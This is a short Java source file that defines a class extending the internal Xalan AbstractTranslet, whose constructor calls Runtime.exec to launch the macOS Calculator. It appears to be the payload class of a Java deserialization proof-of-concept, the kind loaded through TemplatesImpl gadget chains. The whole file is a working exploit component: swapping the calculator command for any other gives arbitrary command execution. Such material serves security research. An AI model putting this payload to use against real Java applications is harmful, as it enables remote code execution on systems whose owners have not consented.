package cn.rui0.idea;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

/**
 * Created by ruilin on 2020/2/15.
 */
public class T extends AbstractTranslet {
    public T() throws IOException {
        Runtime.getRuntime().exec("open /System/Applications/Calculator.app");
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
    public static void main(String[] args) throws Exception {
        T t = new T();
    }
}
